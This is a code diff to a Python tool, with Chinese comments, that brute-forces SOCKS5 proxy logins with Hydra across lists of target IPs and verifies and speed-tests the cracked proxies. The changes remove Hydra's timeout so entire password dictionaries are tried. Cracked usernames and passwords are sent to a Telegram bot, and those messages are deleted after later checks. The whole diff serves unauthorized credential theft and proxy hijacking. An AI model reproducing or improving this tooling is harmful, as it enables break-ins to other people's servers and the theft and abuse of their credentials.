@@ -74,10 +74,12 @@ def send_webhook(title, content):
         raise
 
 
-def send_telegram(message, auto_delete=False):
+def send_telegram(message, auto_delete=False, delete_after=600):
     """
     发送Telegram通知
-    auto_delete: 如果为True，10分钟后自动删除消息
+    auto_delete: 如果为True，指定时间后自动删除消息
+    delete_after: 删除延迟时间(秒)，默认600秒(10分钟)
+    返回: message_id (用于后续删除)
     """
     if not TG_BOT_TOKEN or not TG_CHAT_ID:
         return None
@@ -93,36 +95,51 @@ def send_telegram(message, auto_delete=False):
         resp = requests.post(url, data=data, timeout=5)
         resp.raise_for_status()
         
-        # 如果需要自动删除，返回message_id
-        if auto_delete:
-            result = resp.json()
-            message_id = result.get('result', {}).get('message_id')
-            if message_id:
-                # 10分钟后删除
-                import threading
-                def delete_message():
-                    time.sleep(600)  # 10分钟 = 600秒
-                    delete_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
-                    delete_data = {
-                        "chat_id": TG_CHAT_ID,
-                        "message_id": message_id
-                    }
-                    try:
-                        requests.post(delete_url, data=delete_data, timeout=5)
-                    except:
-                        pass
-                
-                # 启动删除线程
-                threading.Thread(target=delete_message, daemon=True).start()
-                return message_id
+        result = resp.json()
+        message_id = result.get('result', {}).get('message_id')
         
-        return None
+        # 如果需要自动删除
+        if auto_delete and message_id:
+            import threading
+            def delete_message():
+                time.sleep(delete_after)
+                delete_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
+                delete_data = {
+                    "chat_id": TG_CHAT_ID,
+                    "message_id": message_id
+                }
+                try:
+                    requests.post(delete_url, data=delete_data, timeout=5)
+                except:
+                    pass
+            
+            # 启动删除线程
+            threading.Thread(target=delete_message, daemon=True).start()
+        
+        return message_id
         
     except requests.RequestException as e:
         print(f"Telegram发送失败: {e}")
         return None
     except KeyboardInterrupt:
         raise
+
+
+def delete_telegram_message(message_id):
+    """立即删除指定的Telegram消息"""
+    if not TG_BOT_TOKEN or not TG_CHAT_ID or not message_id:
+        return
+    
+    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
+    data = {
+        "chat_id": TG_CHAT_ID,
+        "message_id": message_id
+    }
+    
+    try:
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
 
 
 def send_periodic_report(current, total):
@@ -351,6 +368,7 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
     """
     使用Hydra进行密码爆破 - 改进版
     增强结果验证，降低误报
+    注意：移除了超时限制，确保所有字典组合都被尝试
     """
     update_status(f"{log_prefix} Hydra 正在爆破: {ip}:{port} ...")
     
@@ -359,20 +377,21 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
         "-L", USER_FILE,
         "-P", PASS_FILE,
         "-s", port,
-        "-t", "4",
-        "-w", "1",
-        "-f",  # 找到后立即停止
-        "-I",  # 忽略已有会话
+        "-t", "4",      # 并发线程数
+        "-w", "1",      # 等待响应时间
+        "-f",           # 找到后立即停止
+        "-I",           # 忽略已有会话
         f"socks5://{ip}"
     ]
     
     try:
-        # 设置超时避免卡死
+        # 不设置timeout，让Hydra完整跑完所有字典组合
+        # 这样即使字典很大也能全部尝试完
         res = subprocess.run(
             cmd,
             capture_output=True,
-            text=True,
-            timeout=120
+            text=True
+            # 移除了 timeout=120 参数
         )
         
         # 检查是否真的找到有效密码
@@ -385,7 +404,7 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                     user = match.group(1)
                     pwd = match.group(2)
                     
-                    # 发送爆破成功通知（10分钟后自动删除）
+                    # 发送爆破成功通知，但不自动删除，等验证结果
                     if current > 0 and total > 0:
                         progress_percent = (current / total) * 100
                         tg_msg = (
@@ -395,21 +414,21 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                             f"账号：<code>{user}</code>\n"
                             f"密码：<code>{pwd}</code>\n"
                             f"进度：{current}/{total} ({progress_percent:.1f}%)\n"
-                            f"状态：等待二次验证...\n"
-                            f"<i>💡 此消息10分钟后自动删除</i>"
+                            f"状态：等待二次验证..."
                         )
-                        send_telegram(tg_msg, auto_delete=True)
+                        msg_id = send_telegram(tg_msg, auto_delete=False)
+                        # 返回message_id以便后续删除
+                        return user, pwd, msg_id
                     
-                    return user, pwd, "Success"
+                    return user, pwd, None
         
-        return None, None, "未找到"
+        return None, None, None
         
-    except subprocess.TimeoutExpired:
-        return None, None, "超时"
     except FileNotFoundError:
-        return None, None, "Hydra未安装"
+        return None, None, None
     except Exception as e:
-        return None, None, str(e)[:50]
+        print(f"Hydra执行异常: {e}")
+        return None, None, None
 
 
 def validate_config():
@@ -489,19 +508,25 @@ def main():
         
         # ========== 第二步: 如果需要密码，尝试爆破 ==========
         if not is_no_auth:
-            user, pwd, reason = run_hydra(ip, port, log_prefix=progress_str, 
-                                         current=current_num, total=total)
+            user, pwd, hydra_msg_id = run_hydra(ip, port, log_prefix=progress_str, 
+                                                current=current_num, total=total)
             
             if not user or not pwd:
-                update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} ({reason})")
+                update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} (未找到有效账密)")
                 time.sleep(0.5)  # 失败快速跳过
                 continue
+        else:
+            hydra_msg_id = None  # 无密模式没有hydra消息
         
         # ========== 第三步: 二次验证（多目标测试）==========
         if not is_no_auth:
             update_status(f"{progress_str} 正在二次验证: {user}:{pwd} ...")
             if not verify_login(ip, port, user, pwd, log_prefix=progress_str):
                 update_status(f"⚠️  {progress_str} 二次验证失败: {ip}:{port}")
+                # 验证失败，立即删除之前的爆破成功消息
+                if hydra_msg_id:
+                    delete_telegram_message(hydra_msg_id)
+                    update_status(f"🗑️  {progress_str} 已删除无效的爆破通知")
                 time.sleep(1)
                 continue
         
@@ -509,6 +534,10 @@ def main():
         verify_ok, verify_msg = comprehensive_verify(ip, port, user, pwd, log_prefix=progress_str)
         if not verify_ok:
             update_status(f"⚠️  {progress_str} 综合验证失败: {ip}:{port} ({verify_msg})")
+            # 验证失败，立即删除之前的爆破成功消息
+            if hydra_msg_id:
+                delete_telegram_message(hydra_msg_id)
+                update_status(f"🗑️  {progress_str} 已删除无效的爆破通知")
             time.sleep(1)
             continue
         
@@ -518,16 +547,29 @@ def main():
         # 检查延迟和速度是否都有效
         if lat is None or speed is None:
             update_status(f"❌ {progress_str} 测速失败: {ip}:{port}")
+            # 测速失败，立即删除之前的爆破成功消息
+            if hydra_msg_id:
+                delete_telegram_message(hydra_msg_id)
+                update_status(f"🗑️  {progress_str} 已删除无效的爆破通知")
             time.sleep(1)
             continue
         
         # 速度过滤
         if speed < MIN_SPEED_THRESHOLD:
             update_status(f"⚠️  {progress_str} 速度过慢({speed:.2f}kb/s): {ip}:{port}")
+            # 速度过慢，立即删除之前的爆破成功消息
+            if hydra_msg_id:
+                delete_telegram_message(hydra_msg_id)
+                update_status(f"🗑️  {progress_str} 已删除无效的爆破通知")
             time.sleep(1)
             continue
         
         # ========== 通过所有验证，记录并通知 ==========
+        # 验证成功后，删除临时的爆破成功消息（如果存在）
+        if hydra_msg_id:
+            delete_telegram_message(hydra_msg_id)
+            update_status(f"🗑️  {progress_str} 验证通过，删除临时通知，准备发送完整信息")
+        
         show_u = user if user else "无"
         show_p = pwd if pwd else "无"
         
